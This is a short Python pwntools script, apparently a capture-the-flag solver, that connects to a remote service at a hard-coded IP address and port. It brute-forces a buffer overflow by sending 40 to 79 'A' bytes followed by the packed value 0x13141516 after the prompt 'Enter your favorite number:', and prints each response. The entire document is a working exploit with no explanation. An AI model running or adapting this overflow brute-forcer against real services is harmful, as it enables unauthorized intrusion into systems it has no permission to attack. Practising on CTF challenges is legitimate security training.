from pwn import *

HOST = "103.69.97.144"
PORT = 6001

for padding in range(40, 80):  # Start from 40, go up to 80
    print(f"Trying padding size: {padding}")

    payload = b"A" * padding + p32(0x13141516)

    p = remote(HOST, PORT)
    p.recvuntil(b"Enter your favorite number:")
    p.sendline(payload)

    response = p.recvall(timeout=1)
    print(response.decode())
    p.close()

